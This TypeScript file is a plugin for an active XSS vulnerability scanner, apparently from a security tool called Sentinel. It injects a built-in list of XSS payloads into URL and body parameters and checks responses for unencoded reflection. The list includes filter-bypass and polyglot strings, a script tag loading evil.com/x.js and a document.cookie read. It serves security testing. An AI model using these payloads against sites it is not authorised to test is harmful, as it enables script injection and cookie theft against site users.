/**
 * XSS Scanner Tool (Agent Version)
 * 
 * @plugin xss_scanner
 * @name XSS Scanner
 * @version 1.0.0
 * @author Sentinel Team
 * @category vuln
 * @default_severity high
 * @tags xss, cross-site-scripting, vulnerability, security, web, owasp
 * @description Active XSS vulnerability scanner that tests URL parameters, form fields, and headers with various payloads
 */

// Sentinel Dictionary API declaration
declare const Sentinel: {
    Dictionary: {
        get(idOrName: string): Promise<any>;
        getWords(idOrName: string, limit?: number): Promise<string[]>;
        list(filter?: { dictType?: string; category?: string }): Promise<any[]>;
        getMergedWords(idsOrNames: string[], deduplicate?: boolean): Promise<string[]>;
    };
    log(level: string, message: string): void;
};

interface ToolInput {
    url: string;
    method?: string;
    params?: Record<string, string>;
    headers?: Record<string, string>;
    body?: string;
    contentType?: string;
    timeout?: number;
    concurrency?: number;
    userAgent?: string;
    testReflected?: boolean;
    testStored?: boolean;
    testDom?: boolean;
    customPayloads?: string[];
    dictionaryId?: string;
}

interface XssTest {
    parameter: string;
    location: string;
    payload: string;
    payloadType: string;
    vulnerable: boolean;
    confidence: string;
    evidence?: string;
    context?: string;
    responseCode?: number;
    responseTime?: number;
}

interface ToolOutput {
    success: boolean;
    data?: {
        url: string;
        method: string;
        tests: XssTest[];
        summary: {
            totalTests: number;
            vulnerableCount: number;
            testedParameters: string[];
            vulnerableParameters: string[];
            missingSecurityHeaders: string[];
        };
    };
    error?: string;
}

// XSS payload categories
const XSS_PAYLOADS: Record<string, { payload: string; type: string; context: string }[]> = {
    basic: [
        { payload: "<script>alert(1)</script>", type: "reflected", context: "html" },
        { payload: "<script>alert('XSS')</script>", type: "reflected", context: "html" },
        { payload: "<ScRiPt>alert(1)</ScRiPt>", type: "reflected", context: "html" },
        { payload: "<script src=//evil.com/x.js></script>", type: "reflected", context: "html" },
    ],
    
    event_handlers: [
        { payload: '"><img src=x onerror=alert(1)>', type: "reflected", context: "attribute" },
        { payload: "'\"><img src=x onerror=alert(1)>", type: "reflected", context: "attribute" },
        { payload: "<img src=x onerror=alert(1)>", type: "reflected", context: "html" },
        { payload: "<svg onload=alert(1)>", type: "reflected", context: "html" },
        { payload: "<body onload=alert(1)>", type: "reflected", context: "html" },
        { payload: "<input onfocus=alert(1) autofocus>", type: "reflected", context: "html" },
        { payload: "<marquee onstart=alert(1)>", type: "reflected", context: "html" },
        { payload: "<video><source onerror=alert(1)>", type: "reflected", context: "html" },
        { payload: "<audio src=x onerror=alert(1)>", type: "reflected", context: "html" },
        { payload: "<details open ontoggle=alert(1)>", type: "reflected", context: "html" },
    ],
    
    attribute_escape: [
        { payload: '" onmouseover="alert(1)" x="', type: "reflected", context: "attribute" },
        { payload: "' onmouseover='alert(1)' x='", type: "reflected", context: "attribute" },
        { payload: '" onfocus="alert(1)" autofocus="', type: "reflected", context: "attribute" },
        { payload: "' onfocus='alert(1)' autofocus='", type: "reflected", context: "attribute" },
        { payload: '"><script>alert(1)</script>', type: "reflected", context: "attribute" },
        { payload: "'><script>alert(1)</script>", type: "reflected", context: "attribute" },
    ],
    
    javascript_context: [
        { payload: "';alert(1);//", type: "reflected", context: "script" },
        { payload: '";alert(1);//', type: "reflected", context: "script" },
        { payload: "</script><script>alert(1)</script>", type: "reflected", context: "script" },
        { payload: "'-alert(1)-'", type: "reflected", context: "script" },
        { payload: '"-alert(1)-"', type: "reflected", context: "script" },
        { payload: "${alert(1)}", type: "reflected", context: "template" },
        { payload: "{{constructor.constructor('alert(1)')()}}", type: "reflected", context: "template" },
    ],
    
    url_context: [
        { payload: "javascript:alert(1)", type: "reflected", context: "href" },
        { payload: "javascript:alert(document.domain)", type: "reflected", context: "href" },
        { payload: "data:text/html,<script>alert(1)</script>", type: "reflected", context: "href" },
        { payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", type: "reflected", context: "href" },
    ],
    
    encoding_bypass: [
        { payload: "<scr<script>ipt>alert(1)</scr</script>ipt>", type: "reflected", context: "filter_bypass" },
        { payload: "<scr\\x00ipt>alert(1)</scr\\x00ipt>", type: "reflected", context: "filter_bypass" },
        { payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", type: "reflected", context: "filter_bypass" },
        { payload: "<img src=x onerror=\\u0061lert(1)>", type: "reflected", context: "filter_bypass" },
        { payload: "<img src=x onerror=&#97;lert(1)>", type: "reflected", context: "filter_bypass" },
        { payload: "<img src=x onerror=&#x61;lert(1)>", type: "reflected", context: "filter_bypass" },
    ],
    
    dom_based: [
        { payload: "#<script>alert(1)</script>", type: "dom", context: "fragment" },
        { payload: "#javascript:alert(1)", type: "dom", context: "fragment" },
        { payload: "?default=<script>alert(1)</script>", type: "dom", context: "query" },
        { payload: "javascript:alert(document.cookie)", type: "dom", context: "href" },
    ],
    
    polyglot: [
        { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//", type: "reflected", context: "polyglot" },
        { payload: "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><script>alert(1)</script>", type: "reflected", context: "polyglot" },
        { payload: "'-alert(1)-'", type: "reflected", context: "polyglot" },
    ],
};

// Security headers that mitigate XSS
const SECURITY_HEADERS = [
    "content-security-policy",
    "x-xss-protection",
    "x-content-type-options",
];

/**
 * Export input schema
 */
export function get_input_schema() {
    return {
        type: "object",
        required: ["url"],
        properties: {
            url: {
                type: "string",
                description: "Target URL to test for XSS vulnerabilities"
            },
            method: {
                type: "string",
                enum: ["GET", "POST", "PUT", "PATCH"],
                description: "HTTP method to use",
                default: "GET"
            },
            params: {
                type: "object",
                description: "URL parameters to test (key-value pairs)",
                additionalProperties: { type: "string" }
            },
            headers: {
                type: "object",
                description: "Custom headers to include",
                additionalProperties: { type: "string" }
            },
            body: {
                type: "string",
                description: "Request body (for POST/PUT/PATCH)"
            },
            contentType: {
                type: "string",
                description: "Content-Type header",
                default: "application/x-www-form-urlencoded"
            },
            timeout: {
                type: "integer",
                description: "Request timeout in milliseconds",
                default: 10000,
                minimum: 1000,
                maximum: 30000
            },
            concurrency: {
                type: "integer",
                description: "Number of concurrent requests",
                default: 5,
                minimum: 1,
                maximum: 20
            },
            userAgent: {
                type: "string",
                description: "Custom User-Agent header"
            },
            testReflected: {
                type: "boolean",
                description: "Test for reflected XSS",
                default: true
            },
            testStored: {
                type: "boolean",
                description: "Test for stored XSS indicators",
                default: false
            },
            testDom: {
                type: "boolean",
                description: "Test for DOM-based XSS",
                default: true
            },
            customPayloads: {
                type: "array",
                items: { type: "string" },
                description: "Custom XSS payloads to test"
            },
            dictionaryId: {
                type: "string",
                description: "Dictionary ID or name for XSS payloads"
            }
        }
    };
}

globalThis.get_input_schema = get_input_schema;

/**
 * Generate unique marker for payload tracking
 */
function generateMarker(): string {
    const chars = "abcdefghijklmnopqrstuvwxyz";
    let result = "xss";
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

/**
 * Extract parameters from URL and body
 */
function extractParameters(
    url: string,
    body?: string,
    contentType?: string,
    providedParams?: Record<string, string>
): Map<string, { value: string; location: "query" | "body" | "provided" }> {
    const params = new Map<string, { value: string; location: "query" | "body" | "provided" }>();
    
    // Add provided params first
    if (providedParams) {
        for (const [key, value] of Object.entries(providedParams)) {
            params.set(key, { value, location: "provided" });
        }
    }
    
    // Extract from URL
    try {
        const urlObj = new URL(url);
        urlObj.searchParams.forEach((value, key) => {
            if (!params.has(key)) {
                params.set(key, { value, location: "query" });
            }
        });
    } catch {
        const match = url.match(/\?(.+)/);
        if (match) {
            match[1].split("&").forEach(pair => {
                const [key, ...rest] = pair.split("=");
                if (key && !params.has(key)) {
                    params.set(key, {
                        value: decodeURIComponent(rest.join("=")),
                        location: "query"
                    });
                }
            });
        }
    }
    
    // Extract from body
    if (body) {
        if (contentType?.includes("application/json")) {
            try {
                const json = JSON.parse(body);
                const flatten = (obj: any, prefix = "") => {
                    for (const [key, value] of Object.entries(obj)) {
                        const fullKey = prefix ? `${prefix}.${key}` : key;
                        if (typeof value === "object" && value !== null && !Array.isArray(value)) {
                            flatten(value, fullKey);
                        } else if (typeof value === "string" && !params.has(fullKey)) {
                            params.set(fullKey, { value, location: "body" });
                        }
                    }
                };
                flatten(json);
            } catch { /* ignore */ }
        } else {
            body.split("&").forEach(pair => {
                const [key, ...rest] = pair.split("=");
                if (key && !params.has(key)) {
                    params.set(key, {
                        value: decodeURIComponent(rest.join("=")),
                        location: "body"
                    });
                }
            });
        }
    }
    
    return params;
}

/**
 * Build URL with payload
 */
function buildTestUrl(baseUrl: string, paramName: string, payload: string): string {
    try {
        const url = new URL(baseUrl);
        url.searchParams.set(paramName, payload);
        return url.toString();
    } catch {
        const separator = baseUrl.includes("?") ? "&" : "?";
        return `${baseUrl}${separator}${encodeURIComponent(paramName)}=${encodeURIComponent(payload)}`;
    }
}

/**
 * Build body with payload
 */
function buildTestBody(
    originalBody: string | undefined,
    paramName: string,
    payload: string,
    contentType?: string
): string {
    if (contentType?.includes("application/json")) {
        try {
            const json = JSON.parse(originalBody || "{}");
            const parts = paramName.split(".");
            let current = json;
            for (let i = 0; i < parts.length - 1; i++) {
                if (!current[parts[i]]) current[parts[i]] = {};
                current = current[parts[i]];
            }
            current[parts[parts.length - 1]] = payload;
            return JSON.stringify(json);
        } catch {
            return originalBody || "";
        }
    } else {
        const params = new URLSearchParams(originalBody || "");
        params.set(paramName, payload);
        return params.toString();
    }
}

/**
 * Check if payload is reflected in response
 */
function checkReflection(
    responseBody: string,
    marker: string,
    payload: string
): { reflected: boolean; encoded: boolean; context: string; evidence: string } {
    // Check for marker
    if (!responseBody.includes(marker)) {
        return { reflected: false, encoded: false, context: "", evidence: "" };
    }
    
    // Check for exact payload reflection
    if (responseBody.includes(payload)) {
        const index = responseBody.indexOf(payload);
        const start = Math.max(0, index - 50);
        const end = Math.min(responseBody.length, index + payload.length + 50);
        const context = responseBody.substring(start, end);
        
        // Determine context
        if (/<script[^>]*>[^<]*$/i.test(context) || /^[^<]*<\/script>/i.test(context)) {
            return { reflected: true, encoded: false, context: "script", evidence: context };
        }
        if (/on\w+\s*=\s*["'][^"']*$/i.test(context)) {
            return { reflected: true, encoded: false, context: "event-handler", evidence: context };
        }
        if (/(?:href|src|action)\s*=\s*["'][^"']*$/i.test(context)) {
            return { reflected: true, encoded: false, context: "url-attribute", evidence: context };
        }
        
        return { reflected: true, encoded: false, context: "html", evidence: context };
    }
    
    // Marker found but payload encoded
    const index = responseBody.indexOf(marker);
    const start = Math.max(0, index - 100);
    const end = Math.min(responseBody.length, index + marker.length + 100);
    return { reflected: true, encoded: true, context: "encoded", evidence: responseBody.substring(start, end) };
}

/**
 * Check for dangerous patterns in response
 */
function hasDangerousPatterns(body: string, marker: string): boolean {
    const patterns = [
        new RegExp(`<script[^>]*>[^<]*${marker}`, "i"),
        new RegExp(`on\\w+\\s*=\\s*["'][^"']*${marker}`, "i"),
        new RegExp(`<[^>]+\\s+on\\w+\\s*=.*${marker}`, "i"),
        new RegExp(`javascript:[^"']*${marker}`, "i"),
    ];
    
    return patterns.some(p => p.test(body));
}

/**
 * Check security headers
 */
function checkSecurityHeaders(headers: Record<string, string>): string[] {
    const missing: string[] = [];
    const headerKeys = Object.keys(headers).map(k => k.toLowerCase());
    
    for (const header of SECURITY_HEADERS) {
        if (!headerKeys.includes(header)) {
            missing.push(header);
        }
    }
    
    return missing;
}

/**
 * Run tasks with concurrency limit
 */
async function runWithConcurrency<T>(
    tasks: (() => Promise<T>)[],
    concurrency: number
): Promise<T[]> {
    const results: T[] = [];
    let index = 0;
    
    async function worker() {
        while (index < tasks.length) {
            const currentIndex = index++;
            results[currentIndex] = await tasks[currentIndex]();
        }
    }
    
    const workers = Array(Math.min(concurrency, tasks.length))
        .fill(null)
        .map(() => worker());
    
    await Promise.all(workers);
    return results;
}

/**
 * Load payloads from dictionary or use built-in
 */
async function loadPayloads(
    dictionaryId?: string,
    customPayloads?: string[],
    testReflected?: boolean,
    testDom?: boolean
): Promise<{ payload: string; type: string; context: string }[]> {
    const payloads: { payload: string; type: string; context: string }[] = [];
    
    // Custom payloads first
    if (customPayloads && customPayloads.length > 0) {
        for (const p of customPayloads) {
            payloads.push({ payload: p, type: "custom", context: "unknown" });
        }
    }
    
    // Try dictionary
    if (dictionaryId) {
        try {
            if (typeof Sentinel !== "undefined" && Sentinel.Dictionary) {
                const words = await Sentinel.Dictionary.getWords(dictionaryId);
                if (words && words.length > 0) {
                    for (const p of words) {
                        payloads.push({ payload: p, type: "dictionary", context: "unknown" });
                    }
                    return payloads;
                }
            }
        } catch (e) {
            console.debug(`Failed to load XSS dictionary: ${e}`);
        }
    }
    
    // Use built-in payloads
    if (testReflected !== false) {
        payloads.push(...XSS_PAYLOADS.basic);
        payloads.push(...XSS_PAYLOADS.event_handlers);
        payloads.push(...XSS_PAYLOADS.attribute_escape);
        payloads.push(...XSS_PAYLOADS.javascript_context);
        payloads.push(...XSS_PAYLOADS.url_context);
        payloads.push(...XSS_PAYLOADS.encoding_bypass);
        payloads.push(...XSS_PAYLOADS.polyglot);
    }
    
    if (testDom !== false) {
        payloads.push(...XSS_PAYLOADS.dom_based);
    }
    
    return payloads;
}

/**
 * Main analysis function
 */
export async function analyze(input: ToolInput): Promise<ToolOutput> {
    const startTime = performance.now();
    
    try {
        // Validate input
        if (!input.url || typeof input.url !== "string") {
            return {
                success: false,
                error: "Invalid input: url parameter is required"
            };
        }
        
        let baseUrl = input.url;
        if (!baseUrl.startsWith("http://") && !baseUrl.startsWith("https://")) {
            baseUrl = `https://${baseUrl}`;
        }
        
        const method = (input.method || "GET").toUpperCase();
        const timeout = input.timeout || 10000;
        const concurrency = input.concurrency || 5;
        const userAgent = input.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
        const contentType = input.contentType || "application/x-www-form-urlencoded";
        
        // Extract parameters
        const params = extractParameters(baseUrl, input.body, contentType, input.params);
        
        if (params.size === 0) {
            return {
                success: false,
                error: "No parameters found to test. Provide params or use a URL with query parameters."
            };
        }
        
        // Load payloads
        const payloads = await loadPayloads(
            input.dictionaryId,
            input.customPayloads,
            input.testReflected,
            input.testDom
        );
        
        const tests: XssTest[] = [];
        const vulnerableParams = new Set<string>();
        let missingHeaders: string[] = [];
        
        // Generate marker for this scan
        const marker = generateMarker();
        
        // Create test tasks
        const tasks: (() => Promise<XssTest | null>)[] = [];
        
        for (const [paramName, { value, location }] of params) {
            // Skip very long values
            if (value.length > 500) continue;
            
            for (const { payload: basePayload, type, context } of payloads) {
                tasks.push(async () => {
                    const payload = basePayload.replace(/alert\(1\)/g, `alert('${marker}')`);
                    const testStart = performance.now();
                    
                    try {
                        let testUrl = baseUrl;
                        let testBody = input.body;
                        
                        if (location === "query" || location === "provided") {
                            testUrl = buildTestUrl(baseUrl, paramName, payload);
                        } else if (location === "body") {
                            testBody = buildTestBody(input.body, paramName, payload, contentType);
                        }
                        
                        const headers: Record<string, string> = {
                            "User-Agent": userAgent,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            ...input.headers,
                        };
                        
                        if (method !== "GET" && testBody) {
                            headers["Content-Type"] = contentType;
                        }
                        
                        const response = await fetch(testUrl, {
                            method,
                            headers,
                            body: method !== "GET" ? testBody : undefined,
                            redirect: "follow",
                            // @ts-ignore
                            timeout,
                        });
                        
                        const responseTime = Math.round(performance.now() - testStart);
                        
                        // Check security headers on first response
                        if (missingHeaders.length === 0) {
                            const respHeaders: Record<string, string> = {};
                            response.headers.forEach((v, k) => { respHeaders[k] = v; });
                            missingHeaders = checkSecurityHeaders(respHeaders);
                        }
                        
                        // Only check HTML responses
                        const respContentType = response.headers.get("content-type") || "";
                        if (!respContentType.includes("text/html") && !respContentType.includes("application/xhtml")) {
                            return null;
                        }
                        
                        const body = await response.text();
                        const reflection = checkReflection(body, marker, payload);
                        
                        if (reflection.reflected && !reflection.encoded) {
                            const dangerous = hasDangerousPatterns(body, marker);
                            
                            return {
                                parameter: paramName,
                                location,
                                payload,
                                payloadType: type,
                                vulnerable: true,
                                confidence: dangerous ? "high" : "medium",
                                evidence: reflection.evidence.substring(0, 300),
                                context: reflection.context,
                                responseCode: response.status,
                                responseTime,
                            };
                        }
                        
                        return null;
                        
                    } catch (e: any) {
                        return null;
                    }
                });
            }
        }
        
        // Execute tests with concurrency
        const results = await runWithConcurrency(tasks, concurrency);
        
        // Collect results
        for (const result of results) {
            if (result && result.vulnerable) {
                tests.push(result);
                vulnerableParams.add(result.parameter);
            }
        }
        
        // Deduplicate by parameter (keep highest confidence)
        const uniqueTests = new Map<string, XssTest>();
        for (const test of tests) {
            const key = `${test.parameter}:${test.context}`;
            const existing = uniqueTests.get(key);
            if (!existing || (test.confidence === "high" && existing.confidence !== "high")) {
                uniqueTests.set(key, test);
            }
        }
        
        const finalTests = Array.from(uniqueTests.values());
        
        return {
            success: true,
            data: {
                url: baseUrl,
                method,
                tests: finalTests,
                summary: {
                    totalTests: tasks.length,
                    vulnerableCount: finalTests.length,
                    testedParameters: Array.from(params.keys()),
                    vulnerableParameters: Array.from(vulnerableParams),
                    missingSecurityHeaders: missingHeaders,
                },
            },
        };
        
    } catch (error: any) {
        return {
            success: false,
            error: error instanceof Error ? error.message : String(error),
        };
    }
}

globalThis.analyze = analyze;
